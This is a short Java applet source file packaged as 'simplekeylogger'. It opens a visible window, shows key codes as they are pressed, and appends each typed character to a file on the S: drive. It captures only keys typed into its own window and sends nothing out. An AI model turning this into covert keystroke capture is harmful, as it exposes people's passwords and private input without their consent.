/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

package simplekeylogger;
import java.io.*;
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import java.applet.*;
/**
 *
 * @author Darkio
 */

     public class KP extends Applet {
	A a;
	JTextArea text;

	public void init () {
		a = new A(this);
		a.setSize(600,600);
		a.setVisible(true);
		setLayout(new BorderLayout());
		add("Center", new JScrollPane(text = new JTextArea()));  
                text.setLineWrap(true);
		Font f = new Font("TimesRoman", Font.BOLD, 22);
		text.setFont(f);
                text.setEnabled(false);
                a.add(text);
                a.addWindowListener( new WindowAdapter() { 
                     @Override
                     public void windowClosing( WindowEvent evt ) {
                         JOptionPane.showMessageDialog(null, "Check your file");   
                         System.exit(0); 
        } 
} ); 

	}
}
    
class A extends JFrame implements KeyListener {
	KP kp;
	int count = 0;

	public A (KP kp) { 
		this.kp = kp;
		addKeyListener(this);
	}
        @Override
	public void keyPressed (KeyEvent evt) {
		kp.text.append("<"+String.valueOf(evt.getKeyCode())+":");
		count++;
	}
        @Override
	public void keyTyped (KeyEvent evt) {
		app(String.valueOf(evt.getKeyChar()));
		count++;
	}
        @Override
	public void keyReleased (KeyEvent evt) {
		kp.text.append(":"+String.valueOf(evt.getKeyCode())+">");
		if (count++ > 10) {
			count = 0;
			kp.text.append("\n");	 
		}
	}
	public void app(String s)
	{
		try {
			// Create file 
			FileWriter fstream = new FileWriter("S:\\out.txt", true);//put your unit drive or "\\name.txt"
			BufferedWriter out = new BufferedWriter(fstream);
			out.write(s);
			//Close the output stream
			out.close();
                         
		} catch (Exception e) {//Catch exception if any
			System.err.println("Error: " + e.getMessage());
		}
	}
    
}




